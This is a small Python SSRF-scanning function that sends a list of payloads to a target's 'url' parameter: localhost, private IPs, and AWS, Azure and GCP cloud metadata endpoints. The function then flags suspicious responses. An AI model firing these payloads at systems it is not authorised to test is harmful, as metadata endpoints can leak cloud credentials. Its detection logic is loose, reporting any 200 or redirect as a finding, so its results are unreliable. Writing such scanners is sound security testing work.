import requests
import logging

# ✅ Common SSRF payloads
SSRF_PAYLOADS = [
    "http://127.0.0.1",
    "http://localhost",
    "http://169.254.169.254/latest/meta-data/",  # ✅ AWS metadata endpoint
    "http://169.254.169.254/metadata/instance?api-version=2021-02-01",  # ✅ Azure metadata
    "http://metadata.google.internal/computeMetadata/v1/",  # ✅ GCP metadata
    "http://192.168.1.1",  # ✅ Common internal network IP
    "http://internal.example.com"  # ✅ Example internal hostname
]

def check_ssrf(target_url):
    """
    Checks for SSRF vulnerabilities by testing common SSRF payloads.
    """
    results = []

    try:
        for payload in SSRF_PAYLOADS:
            test_url = f"{target_url.rstrip('/')}?url={payload}"
            response = requests.get(test_url, timeout=5, allow_redirects=False)

            # ✅ If the response contains metadata, it's likely vulnerable
            if response.status_code == 200 and ("instance-id" in response.text or "computeMetadata" in response.text):
                results.append({"url": test_url, "issue": f"Possible SSRF: Accessed {payload}"})
            elif response.status_code in [200, 301, 302]:
                results.append({"url": test_url, "issue": f"Potential SSRF: Redirected to {payload}"})

    except requests.RequestException as e:
        logging.error(f"Failed to test SSRF for {target_url}: {e}")

    return results